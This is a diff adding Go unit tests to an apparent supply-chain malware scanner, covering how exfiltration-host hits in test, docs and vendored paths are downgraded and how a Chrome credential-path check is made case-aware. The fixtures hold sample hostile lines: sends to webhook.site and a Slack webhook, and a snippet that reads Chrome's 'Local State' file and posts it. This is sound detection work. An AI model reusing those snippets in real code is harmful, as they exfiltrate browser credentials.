@@ -148,3 +148,86 @@ func TestScan_LegitStaysClean(t *testing.T) {
 		}
 	}
 }
+
+// TestScan_ExfilInNonShippingPathIsWeak pins the tests/docs/vendored downgrade.
+//
+// The exfil_host tier was documented as "dispositive alone". Measured against
+// 860 real top packages that produced hard blocks on langchain-core (its test
+// FOR SSRF protection), huggingface-hub (API tests), rapidfuzz (vendored
+// bootstrap.js) and textual (a docs example) — packages a developer simply
+// cannot install. A test that asserts a URL is refused necessarily contains
+// that URL.
+func TestScan_ExfilInNonShippingPathIsWeak(t *testing.T) {
+	payload := "url = 'https://hooks.slack.com/services/T00/B00/XXX'\n"
+
+	weak := []string{
+		"pkg-1.0/tests/unit_tests/test_ssrf_protection.py",
+		"pkg-1.0/test/api_test.py",
+		"pkg-1.0/docs/examples/guide/input/key03.py",
+		"pkg-1.0/extern/taskflow/js/bootstrap/4.4.1/bootstrap.js",
+		"pkg-1.0/vendor/thing/client.go",
+		"pkg-1.0/node_modules/dep/index.js",
+		"pkg-1.0/pkg/client_test.go",
+		"pkg-1.0/pkg/test_client.py",
+	}
+	for _, name := range weak {
+		t.Run("weak/"+name, func(t *testing.T) {
+			r := Scan(map[string][]byte{name: []byte(payload)})
+			if !r.Detected {
+				t.Fatalf("indicator should still be REPORTED, not dropped: %s", name)
+			}
+			if !r.Weak {
+				t.Errorf("hit in non-shipping path should be Weak (warn, not block): %s", name)
+			}
+		})
+	}
+
+	shipping := []string{
+		"pkg-1.0/pkg/client.py",
+		"pkg-1.0/src/prompt_toolkit/input/win32.py",
+		"pkg-1.0/setup.py",
+		"pkg-1.0/contrib/telegram.py",
+	}
+	for _, name := range shipping {
+		t.Run("shipping/"+name, func(t *testing.T) {
+			r := Scan(map[string][]byte{name: []byte(payload)})
+			if !r.Detected || r.Weak {
+				t.Errorf("hit in shipping code must stay dispositive (Detected && !Weak): %s got %+v", name, r)
+			}
+		})
+	}
+}
+
+// TestScan_ShippingHitWinsOverWeakHit — a package with the indicator in BOTH a
+// test and its shipping code must still hard-block. The weak tier must never
+// mask a real hit elsewhere in the same archive, regardless of map order.
+func TestScan_ShippingHitWinsOverWeakHit(t *testing.T) {
+	payload := []byte("send('https://webhook.site/abc')\n")
+	for i := 0; i < 50; i++ { // map iteration order is randomised; repeat
+		r := Scan(map[string][]byte{
+			"p/tests/test_x.py": payload,
+			"p/p/real.py":       payload,
+		})
+		if !r.Detected || r.Weak {
+			t.Fatalf("shipping-code hit must win over the test-path hit; got %+v", r)
+		}
+	}
+}
+
+// TestScan_LocalStateProseIsNotACredentialPath pins the casing fix: the English
+// phrase "local state" in a comment must not look like Chrome's `Local State`
+// credential file. This blocked opentelemetry-api and oauthlib at install time.
+func TestScan_LocalStateProseIsNotACredentialPath(t *testing.T) {
+	prose := map[string][]byte{
+		"p/ctx.py": []byte("# restore the local state of the span context\nrequests.post(u)\n"),
+	}
+	if r := Scan(prose); r.Detected {
+		t.Errorf("prose 'local state' must not be a credential-store hit; got %+v", r)
+	}
+	real := map[string][]byte{
+		"p/steal.py": []byte(`p = "~/Library/Application Support/Google/Chrome/Local State"` + "\nrequests.post(u, data=open(p,'rb'))\n"),
+	}
+	if r := Scan(real); !r.Detected || r.Kind != "stealer_string" {
+		t.Errorf("a real Chrome Local State path coupled with a send must still fire; got %+v", r)
+	}
+}
